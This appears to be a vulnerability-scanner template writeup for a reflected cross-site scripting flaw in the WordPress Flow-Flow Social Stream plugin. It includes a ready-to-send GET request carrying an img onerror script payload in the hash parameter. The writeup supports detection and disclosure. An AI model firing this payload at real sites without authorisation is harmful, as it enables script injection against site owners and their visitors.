# Nuclei Template: WordPress Flow-Flow Social Stream <=3.0.71 - Cross-Site Scripting
**Template ID:** flow-flow-social-stream-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`flow-flow-social-stream-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```

## References
- https://wpscan.com/vulnerability/8354b34e-40f4-4b70-bb09-38e2cf572ce9
